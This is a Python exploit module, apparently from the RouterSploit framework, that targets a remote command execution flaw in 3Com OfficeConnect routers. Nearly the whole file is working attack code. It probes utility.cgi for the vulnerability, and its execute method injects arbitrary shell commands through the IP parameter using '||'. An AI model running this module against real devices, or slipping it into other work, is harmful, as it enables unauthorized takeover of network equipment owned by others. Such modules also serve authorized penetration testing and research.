# rsf exploit module
# description: Module exploits 3Com OfficeConnect remote command execution
# vulnerability which allows executing command on operating system level.

import requests

class Exploit:
    __info__ = {
        "name": "3Com OfficeConnect RCE",
        "description": "Module exploits 3Com OfficeConnect remote command execution"
                       "vulnerability which allows executing command on operating system level.",
        "authors": (
            "Andrea Fabizi",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/9862/",
        ),
        "devices": (
            "3Com OfficeConnect",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        response1 = requests.get(f"http://{self.target}:{self.port}/utility.cgi?testType=1&IP=aaa")

        if response1 and response1.status_code == 200:
            path = f"/{self._random_text(32)}.cgi"
            response2 = requests.get(f"http://{self.target}:{self.port}{path}")

            if not response2 or response1.text != response2.text:
                print("Target appears to be vulnerable")
                print("Invoking command loop...")
                print("It is blind command injection - response is not available")
            else:
                print("Exploit failed - target does not seem to be vulnerable")
        else:
            print("Exploit failed - target does not seem to be vulnerable")

    def _random_text(self, length):
        import random
        import string
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    def execute(self, cmd):
        path = f"/utility.cgi?testType=1&IP=aaa || {cmd}"
        requests.get(f"http://{self.target}:{self.port}{path}")

